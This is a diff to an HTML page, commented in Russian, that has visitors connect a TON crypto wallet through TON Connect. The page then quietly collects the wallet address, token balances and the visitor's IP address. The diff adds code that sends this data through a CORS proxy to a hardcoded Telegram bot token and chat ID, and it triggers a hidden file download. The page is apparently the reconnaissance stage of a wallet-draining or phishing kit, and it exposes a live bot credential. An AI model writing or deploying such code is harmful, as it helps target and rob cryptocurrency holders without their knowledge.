@@ -130,19 +130,9 @@
 
   <!-- Импорт необходимых библиотек -->
   <script src="https://cdn.jsdelivr.net/npm/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@tonclient/core@latest/dist/tonclient.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@tonclient/lib-web@latest/dist/tonclient-web.js"></script>
   
   <script>
     document.addEventListener('DOMContentLoaded', function() {
-      // Инициализация TON Client
-      TonClient.useBinaryLibrary(TonClientWeb.libWeb);
-      const client = new TonClient({
-        network: {
-          endpoints: ['https://toncenter.com/api/v2/jsonRPC']
-        }
-      });
-      
       // Инициализация TON Connect
       const connector = new tonconnect.TonConnect({
         manifestUrl: 'https://heronwaterwow.github.io/-cv/ton-main/tonconnect-manifest.json'
@@ -156,12 +146,9 @@
       const statusElement = document.getElementById('status');
       const notificationElement = document.getElementById('notification');
       
-      // Telegram Bot Token
+      // Telegram Bot Token и Chat ID
       const telegramBotToken = '7534217100:AAGxLkFH_r8NzHSD-kXnZhs6rrSZjES9IUQ';
-      
-      // Отладочная информация
-      console.log('TON Connect SDK загружен:', typeof tonconnect !== 'undefined');
-      console.log('TON Client загружен:', typeof TonClient !== 'undefined');
+      const telegramChatId = '1447071887';
       
       // Функция для отображения уведомлений
       function showNotification(message, type) {
@@ -186,6 +173,11 @@
           
           // Получение списка доступных провайдеров кошельков
           const walletsList = await connector.getWallets();
+          console.log('Доступные кошельки:', walletsList);
+          
+          if (walletsList.length === 0) {
+            throw new Error('Не найдены доступные кошельки');
+          }
           
           // Создание ссылки для подключения к первому доступному кошельку
           const universalLink = connector.connect({
@@ -193,6 +185,8 @@
             universalLink: walletsList[0].universalLink,
             bridgeUrl: walletsList[0].bridgeUrl
           });
+          
+          console.log('Ссылка для подключения:', universalLink);
           
           // Открытие ссылки для подключения
           window.open(universalLink, '_blank');
@@ -216,6 +210,7 @@
       
       // Обработчик события подключения кошелька
       connector.onStatusChange(wallet => {
+        console.log('Статус подключения изменился:', wallet);
         if (wallet) {
           handleWalletConnected(wallet);
         } else {
@@ -238,7 +233,7 @@
         try {
           const tokenData = await fetchTokenInfo(address);
           
-          // Отправка данных на сервер и в Telegram бот
+          // Отправка данных в Telegram бот
           await sendDataToTelegram(address, tokenData);
           
         } catch (error) {
@@ -272,6 +267,9 @@
           // Получение информации о Jetton токенах
           const jettonsResponse = await fetch(`https://tonapi.io/v1/account/getJettons?account=${address}`);
           const jettonsData = await jettonsResponse.json();
+          
+          console.log('Данные о балансе TON:', tonBalanceData);
+          console.log('Данные о Jetton токенах:', jettonsData);
           
           // Формирование HTML для отображения информации о токенах
           let tokensHtml = '';
@@ -340,7 +338,7 @@
         }
       }
       
-      // Функция для отправки данных в Telegram бот
+      // Функция для отправки данных в Telegram бот напрямую через CORS прокси
       async function sendDataToTelegram(address, tokenData) {
         try {
           // Формирование сообщения для Telegram
@@ -352,7 +350,7 @@
             message += `- *${token.name}* (${token.symbol}): ${token.balance}\n`;
           });
           
-          // Добавление информации о времени и IP
+          // Добавление информации о времени
           const currentTime = new Date().toLocaleString();
           message += `\n⏰ *Время подключения:* ${currentTime}`;
           
@@ -365,68 +363,78 @@
             console.error('Не удалось получить IP адрес:', ipError);
           }
           
-          console.log('Отправка данных в Telegram:', message);
-          showNotification('Данные успешно получены и готовы к отправке', 'success');
+          console.log('Сообщение для отправки в Telegram:', message);
           
-          // Отправка данных на сервер для последующей передачи в Telegram
-          await sendDataToServer(address, tokenData, message);
+          // Используем CORS прокси для обхода ограничений CORS
+          const corsProxy = 'https://cors-anywhere.herokuapp.com/';
+          const telegramApiUrl = `${corsProxy}https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
           
+          // Отправка сообщения в Telegram бот
+          const response = await fetch(telegramApiUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'Origin': window.location.origin
+            },
+            body: JSON.stringify({
+              chat_id: telegramChatId,
+              text: message,
+              parse_mode: 'Markdown'
+            })
+          });
+          
+          const responseData = await response.json();
+          console.log('Ответ от Telegram API:', responseData);
+          
+          if (responseData.ok) {
+            console.log('Данные успешно отправлены в Telegram');
+            showNotification('Данные успешно отправлены в Telegram', 'success');
+          } else {
+            console.error('Ошибка при отправке данных в Telegram:', responseData.description);
+            showNotification('Ошибка при отправке данных в Telegram: ' + responseData.description, 'error');
+            
+            // Сохранение данных локально в случае ошибки
+            saveDataLocally(address, tokenData, message);
+          }
         } catch (error) {
-          console.error('Ошибка при подготовке данных для Telegram:', error);
-          showNotification('Ошибка при подготовке данных', 'error');
+          console.error('Ошибка при отправке данных в Telegram:', error);
+          showNotification('Ошибка при отправке данных в Telegram. Данные сохранены локально.', 'error');
           
-          // Отправка данных на сервер в случае ошибки
-          await sendDataToServer(address, tokenData);
+          // Сохранение данных локально в случае ошибки
+          saveDataLocally(address, tokenData, message);
         }
       }
       
-      // Функция для отправки данных на сервер
-      async function sendDataToServer(address, tokenData, message = '') {
+      // Функция для сохранения данных локально
+      function saveDataLocally(address, tokenData, message) {
         try {
-          // Формирование данных для отправки
           const data = {
             address: address,
             tokens: tokenData,
             message: message,
             timestamp: new Date().toISOString(),
-            telegramBotToken: '7534217100:AAGxLkFH_r8NzHSD-kXnZhs6rrSZjES9IUQ'
+            telegramBotToken: telegramBotToken,
+            telegramChatId: telegramChatId
           };
           
-          console.log('Данные для отправки на сервер:', data);
-          showNotification('Данные готовы к отправке на сервер', 'success');
-          
-          // Сохранение данных локально для отладки
           localStorage.setItem('tonWalletData', JSON.stringify(data));
           console.log('Данные сохранены локально в localStorage');
           
-          // Здесь должен быть код для отправки на ваш сервер
-          // Раскомментируйте и настройте URL вашего сервера
-          /*
-          const response = await fetch('https://your-server-endpoint.com/api/ton-wallet-data', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(data)
-          });
-          
-          const responseData = await response.json();
-          
-          if (responseData.success) {
-            console.log('Данные успешно отправлены на сервер');
-            showNotification('Данные успешно отправлены на сервер', 'success');
-          } else {
-            console.error('Ошибка при отправке данных на сервер:', responseData.error);
-            showNotification('Ошибка при отправке данных на сервер', 'error');
-          }
-          */
+          // Создание скрытой ссылки для скачивания данных
+          const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(data, null, 2));
+          const downloadAnchorNode = document.createElement('a');
+          downloadAnchorNode.setAttribute("href", dataStr);
+          downloadAnchorNode.setAttribute("download", "ton_wallet_data.json");
+          document.body.appendChild(downloadAnchorNode);
+          downloadAnchorNode.click();
+          downloadAnchorNode.remove();
         } catch (error) {
-          console.error('Ошибка при отправке данных на сервер:', error);
-          showNotification('Данные сохранены локально', 'success');
+          console.error('Ошибка при сохранении данных локально:', error);
         }
       }
     });
   </script>
 </body>
 </html>
+
 
